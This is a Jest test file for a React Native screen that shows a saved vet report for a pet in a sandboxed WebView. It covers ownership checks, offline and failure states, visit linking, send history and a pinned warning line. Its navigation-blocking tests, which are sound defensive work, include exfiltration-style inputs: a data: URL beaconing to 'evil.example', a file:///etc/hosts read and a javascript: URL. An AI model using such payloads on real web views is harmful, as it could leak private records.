// One saved report (Vet report v2 PR-21, CUL-2301): the stored copy drawn as sent, the states
// that show nothing, whose report it is, and the one action that never reads as updating it.

import React from 'react';
import { StyleSheet } from 'react-native';
import { act, render, fireEvent, waitFor } from '@testing-library/react-native';

const mockPush = jest.fn();
let mockParams: { id?: string; pet?: string } = {};
jest.mock('expo-router', () => ({
  router: { push: (...a: unknown[]) => mockPush(...a), back: jest.fn() },
  useLocalSearchParams: () => mockParams,
}));
jest.mock('react-native-safe-area-context', () => {
  const { View } = require('react-native');
  return { SafeAreaView: View, useSafeAreaInsets: () => ({ top: 0, bottom: 0, left: 0, right: 0 }) };
});
jest.mock('react-native-webview', () => {
  const { View } = require('react-native');
  return { WebView: (props: Record<string, unknown>) => require('react').createElement(View, props) };
});

type MockPet = { id: string; name: string };
let mockPets: MockPet[] = [];
jest.mock('../../store/petStore', () => ({
  ANONYMOUS_PET_NAME: 'your pet',
  usePetStore: (sel: (s: { pets: MockPet[] }) => unknown) => sel({ pets: mockPets }),
  resolveRecordPetName: (pets: MockPet[], id?: string | null) => pets.find((p) => p.id === id)?.name || 'your pet',
}));

const mockReadOne = jest.fn();
const mockOpen = jest.fn();
const mockSends = jest.fn();
jest.mock('../../lib/reportLibrary', () => ({
  ...jest.requireActual('../../lib/reportLibrary'),
  readSavedReport: (...a: unknown[]) => mockReadOne(...a),
  openSavedReport: (...a: unknown[]) => mockOpen(...a),
  readDepartures: (...a: unknown[]) => mockSends(...a),
}));
jest.mock('../../lib/supabase', () => ({ supabase: {} }));

// PR-22 (CUL-2302): the copy's visit link and the picker's choices.
const mockReadLink = jest.fn();
const mockLink = jest.fn();
jest.mock('../../lib/reportVisitLink', () => ({
  ...jest.requireActual('../../lib/reportVisitLink'),
  readReportLink: (...a: unknown[]) => mockReadLink(...a),
  linkSavedReport: (...a: unknown[]) => mockLink(...a),
}));
const mockHome = jest.fn();
jest.mock('../../lib/vetVisits', () => ({
  formatVisitDate: () => 'Oct 30',
  readVetVisitsHome: (...a: unknown[]) => mockHome(...a),
}));

import SavedReportScreen from './[id]';
import { reportFrameLoadAllowed } from '../../lib/reportPreviewV2';
import { boxedPreviewHtml } from '../../components/reportV2/ReportPreviewV2';
import { EXAM_CSP } from '../../lib/examRoom';

const COOPER = { id: 'pet-cooper', name: 'Cooper' };
const thisYear = new Date().getFullYear();
const ROW = {
  id: 'r1', petId: COOPER.id, shortId: 'Q7K4', startDate: '2026-09-16', endDate: '2026-10-29',
  sharedVia: 'email', sharedAt: new Date(thisYear, 9, 30, 12).toISOString(),
};

beforeEach(() => {
  jest.clearAllMocks();
  mockPets = [COOPER, { id: 'pet-mira', name: 'Mira' }];
  mockParams = { id: 'r1', pet: COOPER.id };
  mockReadOne.mockResolvedValue(ROW);
  mockOpen.mockResolvedValue({ kind: 'ok', html: '<html>as sent</html>' });
  mockReadLink.mockResolvedValue(null);
  mockSends.mockResolvedValue({ kind: 'ok', departures: [] });
  mockLink.mockResolvedValue({ kind: 'ok' });
  mockHome.mockResolvedValue({
    next: null, later: [], awaiting: [],
    visits: [{ id: 'v1', petId: COOPER.id, visitedAt: '2026-10-30', stamp: null, title: 'Recheck', where: 'Riverside', tags: [] }],
  });
});

it('draws the stored copy as sent, locked, under its pet and date', async () => {
  const view = render(<SavedReportScreen />);
  await waitFor(() => expect(view.getByTestId('report-copy')).toBeTruthy());
  const web = view.getByTestId('report-copy');
  expect(web.props.source).toEqual({ html: boxedPreviewHtml('<html>as sent</html>') });
  expect(web.props.javaScriptEnabled).toBe(false);
  expect(web.props.incognito).toBe(true);
  expect(web.props.cacheEnabled).toBe(false);
  expect(web.props.onShouldStartLoadWithRequest({ url: 'https://example.com/x' })).toBe(false);
  expect(view.getByText('Cooper · Oct 30 report')).toBeTruthy();
  expect(view.getByText('The report as you sent it on Oct 30. Anything logged or changed since isn’t in it.')).toBeTruthy();
  expect(mockOpen).toHaveBeenCalledWith(COOPER.id, 'r1');
});

it('the one action makes a new report and says this copy stays as sent (WBC-4)', async () => {
  const view = render(<SavedReportScreen />);
  await waitFor(() => expect(view.getByTestId('report-new')).toBeTruthy());
  expect(view.getByText('New report through today')).toBeTruthy();
  expect(view.getByText('The Oct 30 copy stays exactly as sent')).toBeTruthy();
  expect(view.queryByText(/update/i)).toBeNull();
  fireEvent.press(view.getByTestId('report-new'));
  expect(mockPush).toHaveBeenCalledWith('/report');
});

it('a pet this account does not hold opens nothing and asks the server nothing', async () => {
  mockParams = { id: 'r1', pet: 'someone-elses-pet' };
  const view = render(<SavedReportScreen />);
  await waitFor(() => expect(view.getByTestId('report-unavailable')).toBeTruthy());
  expect(mockOpen).not.toHaveBeenCalled();
  expect(mockReadOne).not.toHaveBeenCalled();
  expect(view.queryByTestId('report-copy')).toBeNull();
});

it('a copy the server will not show (gone, or no longer the file sent) shows nothing', async () => {
  mockOpen.mockResolvedValue({ kind: 'unavailable' });
  const view = render(<SavedReportScreen />);
  await waitFor(() => expect(view.getByTestId('report-unavailable')).toBeTruthy());
  expect(view.queryByTestId('report-copy')).toBeNull();
  expect(view.queryByTestId('report-as-sent')).toBeNull();
});

it('offline says so and retries', async () => {
  mockOpen.mockResolvedValueOnce({ kind: 'offline' }).mockResolvedValueOnce({ kind: 'ok', html: '<html>as sent</html>' });
  const view = render(<SavedReportScreen />);
  await waitFor(() => expect(view.getByTestId('report-offline')).toBeTruthy());
  fireEvent.press(view.getByText('Try again'));
  await waitFor(() => expect(view.getByTestId('report-copy')).toBeTruthy());
});

it('bytes for an id whose row the owner cannot read are never drawn', async () => {
  mockReadOne.mockResolvedValue(null);
  const view = render(<SavedReportScreen />);
  await waitFor(() => expect(view.getByTestId('report-unavailable')).toBeTruthy());
  expect(view.queryByTestId('report-copy')).toBeNull();
});

describe('its visit (PR-22, CUL-2302)', () => {
  it('a copy filed under nothing offers to attach it, and one tap files it', async () => {
    const view = render(<SavedReportScreen />);
    await waitFor(() => expect(view.getByTestId('report-visit-attach')).toBeTruthy());
    expect(mockReadLink).toHaveBeenCalledWith(COOPER.id, 'r1');
    expect(mockHome).toHaveBeenCalledWith(COOPER.id);
    fireEvent.press(view.getByTestId('report-visit-attach'));
    expect(view.getByText('This only files the report. The copy stays exactly as sent.')).toBeTruthy();
    fireEvent.press(view.getByTestId('visit-link-visit-v1'));
    await waitFor(() => expect(view.getByTestId('report-visit-line')).toBeTruthy());
    expect(mockLink).toHaveBeenCalledWith(COOPER.id, 'r1', { kind: 'visit', id: 'v1' });
    expect(view.getByText('For the Oct 30 visit')).toBeTruthy();
  });

  it('a filed copy names its visit and can be taken off it', async () => {
    mockReadLink.mockResolvedValue({ kind: 'visit', id: 'v1' });
    const view = render(<SavedReportScreen />);
    await waitFor(() => expect(view.getByText('For the Oct 30 visit')).toBeTruthy());
    fireEvent.press(view.getByTestId('report-visit-change'));
    fireEvent.press(view.getByTestId('visit-link-none'));
    await waitFor(() => expect(view.getByTestId('report-visit-attach')).toBeTruthy());
    expect(mockLink).toHaveBeenCalledWith(COOPER.id, 'r1', null);
  });

  it('a refused write says so and keeps the copy as it was', async () => {
    mockLink.mockResolvedValue({ kind: 'refused' });
    const view = render(<SavedReportScreen />);
    await waitFor(() => expect(view.getByTestId('report-visit-attach')).toBeTruthy());
    fireEvent.press(view.getByTestId('report-visit-attach'));
    fireEvent.press(view.getByTestId('visit-link-visit-v1'));
    await waitFor(() => expect(view.getByTestId('report-visit-error')).toBeTruthy());
    expect(view.getByTestId('report-visit-attach')).toBeTruthy();
    expect(view.queryByTestId('report-visit-line')).toBeNull();
  });

  it('a link read that failed offers nothing, never "Attach" over a copy that may be filed', async () => {
    mockReadLink.mockResolvedValue('failed');
    const view = render(<SavedReportScreen />);
    await waitFor(() => expect(view.getByTestId('report-new')).toBeTruthy());
    await waitFor(() => expect(mockReadLink).toHaveBeenCalled());
    expect(view.queryByTestId('report-visit')).toBeNull();
  });

  it('a pet this account does not hold reads no link', async () => {
    mockParams = { id: 'r1', pet: 'someone-elses-pet' };
    render(<SavedReportScreen />);
    await waitFor(() => expect(mockOpen).not.toHaveBeenCalled());
    expect(mockReadLink).not.toHaveBeenCalled();
    expect(mockHome).not.toHaveBeenCalled();
  });
});

// CUL-2445 (migration 119): every time this copy was sent.
describe('the send history', () => {
  const send = (i: number, via: string, hour: number) => ({
    id: `d${i}`, sharedVia: via, sharedAt: new Date(thisYear, 10, 3, hour, 0).toISOString(),
  });

  it('lists each send of this copy, newest first, under a count of the whole history', async () => {
    mockSends.mockResolvedValue({ kind: 'ok', departures: [send(1, 'print', 16), send(2, 'email', 9)] });
    const view = render(<SavedReportScreen />);
    await waitFor(() => expect(view.getByTestId('report-sends')).toBeTruthy());
    expect(mockSends).toHaveBeenCalledWith(COOPER.id, 'r1');
    expect(view.getByTestId('report-sends-heading').props.children).toBe('Sent 2 times');
    expect(view.getAllByTestId('report-send').map((n) => n.props.children)).toEqual([
      'Printed · Nov 3, 4:00 PM',
      'Shared by email · Nov 3, 9:00 AM',
    ]);
    expect(view.queryByTestId('report-sends-all')).toBeNull();
  });

  it('shows the newest three, and the rest on a tap', async () => {
    mockSends.mockResolvedValue({ kind: 'ok', departures: [1, 2, 3, 4, 5].map((i) => send(i, 'email', 8 + i)) });
    const view = render(<SavedReportScreen />);
    await waitFor(() => expect(view.getByTestId('report-sends')).toBeTruthy());
    expect(view.getByTestId('report-sends-heading').props.children).toBe('Sent 5 times');
    expect(view.getAllByTestId('report-send')).toHaveLength(3);
    fireEvent.press(view.getByTestId('report-sends-all'));
    expect(view.getAllByTestId('report-send')).toHaveLength(5);
    expect(view.queryByTestId('report-sends-all')).toBeNull();
  });

  it('a failed read shows nothing, never a shorter history', async () => {
    mockSends.mockResolvedValue({ kind: 'failed' });
    const view = render(<SavedReportScreen />);
    await waitFor(() => expect(view.getByTestId('report-copy')).toBeTruthy());
    await waitFor(() => expect(mockSends).toHaveBeenCalled());
    expect(view.queryByTestId('report-sends')).toBeNull();
    expect(view.getByTestId('report-new')).toBeTruthy();
  });

  it('a pet this account does not hold reads no history', async () => {
    mockParams = { id: 'r1', pet: 'pet-someone-else' };
    const view = render(<SavedReportScreen />);
    await waitFor(() => expect(view.getByTestId('report-unavailable')).toBeTruthy());
    expect(mockSends).not.toHaveBeenCalled();
    expect(view.queryByTestId('report-sends')).toBeNull();
  });
});

describe('boxed in like the preview (CUL-2487)', () => {
  it('every navigation reaches the load predicate, the page carries the room’s CSP, and no window opens', async () => {
    mockOpen.mockResolvedValue({ kind: 'ok', html: '<!DOCTYPE html><html><head><title>t</title></head><body>x</body></html>' });
    const view = render(<SavedReportScreen />);
    await waitFor(() => expect(view.getByTestId('report-copy')).toBeTruthy());
    const web = view.getByTestId('report-copy');
    // `['about:*', 'data:*']` handed a failing URL to the system browser, never to the predicate.
    expect(web.props.originWhitelist).toEqual(['*']);
    expect(web.props.source.html).toContain(`<head><meta http-equiv="Content-Security-Policy" content="${EXAM_CSP}">`);
    expect(typeof web.props.onOpenWindow).toBe('function');
    for (const url of ['https://example.com/?d=record', 'nyx://reports', 'file:///etc/hosts', 'javascript:alert(1)']) {
      expect(web.props.onShouldStartLoadWithRequest({ url })).toBe(false);
    }
    expect(web.props.onShouldStartLoadWithRequest({ url: 'about:blank' })).toBe(true);
  });

  it('every data: navigation is refused: the page can never hop to a document without the CSP (privacy pass 2)', async () => {
    const view = render(<SavedReportScreen />);
    await waitFor(() => expect(view.getByTestId('report-copy')).toBeTruthy());
    const web = view.getByTestId('report-copy');
    const hop = 'data:text/html,<img src="https://evil.example/?d=';
    expect(web.props.onShouldStartLoadWithRequest({ url: hop })).toBe(false);
    expect(web.props.onShouldStartLoadWithRequest({ url: 'data:text/html;charset=utf-8,x' })).toBe(false);
    // The copy's own document (iOS reports it as about:blank) still loads.
    expect(web.props.onShouldStartLoadWithRequest({ url: 'about:blank' })).toBe(true);
    // The shared check, the one every v2 report frame passes (CUL-2494).
    expect(web.props.onShouldStartLoadWithRequest).toBe(reportFrameLoadAllowed);
    // No load-end gate to race.
    expect(web.props.onLoadEnd).toBeUndefined();
  });
});

describe('the bars never show without their warning (CUL-2467)', () => {
  const line = 'Not a test of the diet alone. Overlapping the trial: Apoquel, overlapping it Oct 1 to Oct 20.';
  const printed = (conf: string) => `<html><head></head><body><section class="leadchart" data-block="lead_chart"><svg></svg></section>${conf}</body></html>`;

  it('a printed page with a confounder line pins that line, in full, above the page', async () => {
    mockOpen.mockResolvedValue({ kind: 'ok', html: printed(`<p class="conf" data-block="confounder">${line}</p>`) });
    const view = render(<SavedReportScreen />);
    await waitFor(() => expect(view.getByTestId('report-copy')).toBeTruthy());
    const hidden = { includeHiddenElements: true };
    const pin = view.getByTestId('report-copy-warning', hidden);
    expect(view.getByText(line, hidden)).toBeTruthy();
    // A repeat for the eye; a screen reader reaches the line in the page, in print order.
    expect(pin.props.accessibilityElementsHidden).toBe(true);
    expect(pin.props.importantForAccessibility).toBe('no-hide-descendants');
    // A sibling above the page in the same column, never an overlay on it.
    const json = JSON.stringify(view.toJSON());
    expect(json.indexOf('"report-copy-warning"')).toBeGreaterThan(-1);
    expect(json.indexOf('"report-copy-warning"')).toBeLessThan(json.indexOf('"report-copy"'));
    expect(pin.props.style).not.toEqual(expect.objectContaining({ position: 'absolute' }));
    // Never taller than the paper: it shrinks and scrolls rather than clip (adversarial pass 1).
    expect(StyleSheet.flatten(pin.props.style)).toEqual(expect.objectContaining({ flexGrow: 0, flexShrink: 1 }));
  });

  it('a printed page with no confounder pins nothing', async () => {
    mockOpen.mockResolvedValue({ kind: 'ok', html: printed('') });
    const view = render(<SavedReportScreen />);
    await waitFor(() => expect(view.getByTestId('report-copy')).toBeTruthy());
    expect(view.queryByTestId('report-copy-warning', { includeHiddenElements: true })).toBeNull();
  });

  it('a confounder whose line cannot be read back is not drawn at all: no bars without the pin', async () => {
    mockOpen.mockResolvedValue({ kind: 'ok', html: printed(`<p data-block="confounder" class="conf">${line}</p>`) });
    const view = render(<SavedReportScreen />);
    await waitFor(() => expect(view.getByTestId('report-unavailable')).toBeTruthy());
    expect(view.queryByTestId('report-copy')).toBeNull();
    expect(view.queryByTestId('report-copy-warning', { includeHiddenElements: true })).toBeNull();
    expect(view.queryByTestId('report-as-sent')).toBeNull();
    expect(view.queryByText('Try again')).toBeNull();
  });
});

describe('the main read: one copy at a time (CUL-2477)', () => {
  it('a params change clears the previous copy’s row, so a failed read never keeps its pet’s name', async () => {
    const view = render(<SavedReportScreen />);
    await waitFor(() => expect(view.getByText('Cooper · Oct 30 report')).toBeTruthy());
    mockParams = { id: 'r2', pet: 'pet-mira' };
    mockReadOne.mockResolvedValue('failed');
    mockOpen.mockResolvedValue({ kind: 'failed' });
    view.rerender(<SavedReportScreen />);
    await waitFor(() => expect(view.getByTestId('report-failed')).toBeTruthy());
    expect(view.queryByText(/Cooper/)).toBeNull();
    expect(view.getByText('Saved report')).toBeTruthy();
  });

  it('a late answer for an earlier copy never lands on this one', async () => {
    let releaseOld: (v: unknown) => void = () => undefined;
    mockReadOne.mockImplementationOnce(() => new Promise((res) => { releaseOld = res; }));
    mockOpen.mockImplementationOnce(() => Promise.resolve({ kind: 'ok', html: '<html>cooper</html>' }));
    const view = render(<SavedReportScreen />);
    mockParams = { id: 'r2', pet: 'pet-mira' };
    const MIRA_ROW = { ...ROW, id: 'r2', petId: 'pet-mira' };
    mockReadOne.mockResolvedValue(MIRA_ROW);
    mockOpen.mockResolvedValue({ kind: 'ok', html: '<html>mira</html>' });
    view.rerender(<SavedReportScreen />);
    await waitFor(() => expect(view.getByText('Mira · Oct 30 report')).toBeTruthy());
    await act(async () => {
      releaseOld(ROW);
    });
    expect(view.getByText('Mira · Oct 30 report')).toBeTruthy();
    expect(view.queryByText(/Cooper/)).toBeNull();
    expect(view.getByTestId('report-copy').props.source).toEqual({ html: boxedPreviewHtml('<html>mira</html>') });
  });
});
